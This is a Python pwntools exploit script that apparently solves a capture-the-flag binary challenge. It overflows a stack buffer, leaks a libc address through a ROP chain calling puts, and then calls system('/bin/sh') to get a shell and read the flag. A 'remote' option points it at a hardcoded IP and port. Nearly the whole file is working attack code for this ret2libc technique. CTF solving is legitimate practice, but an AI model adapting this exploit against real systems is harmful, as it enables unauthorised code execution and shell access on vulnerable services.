#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info")
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/rootersctf/pwn/baby-pwn/vuln")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def un64(data):
    return int(data[::-1].encode("hex"),16)

def exploit(r):
    attach(r)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    puts_plt = 0x0000000000401030
    puts_got = 0x000000404018
    main 	 = 0x0000000000401146
    pop_rdi  = 0x0000000000401223
    pop_rsi_r15 = 0x0000000000401221

    off = 264
    p = ("B" * (off-1) + "<")
    p += p64(pop_rdi)
    p += p64(puts_got)
    p += p64(puts_plt)
    p += p64(main)

    r.sendlineafter(">",p)
    r.recvuntil("<")
    r.recvuntil("\n")
    leak = un64(r.recvline().split()[0])
    log.info("puts@libc : " + hex(leak))

    libc_base   = leak - libc.symbols['_IO_puts']
    libc_system = libc_base + libc.symbols['system'] 
    libc_binsh  = libc_base + libc.search("/bin/sh").next()

    log.info("system() : " + hex(libc_system))
    log.info("/bin/sh  : " + hex(libc_binsh))

    q = "A" * off
    q += p64(pop_rdi)
    q += p64(libc_binsh)
    q += p64(libc_system)
    q += p64(pop_rdi)
    q += p64(libc_binsh)
    q += p64(libc_system)
    r.sendline(q)
    r.sendline("cat /home/vuln/flag.txt")
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("35.188.73.186", 1111)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
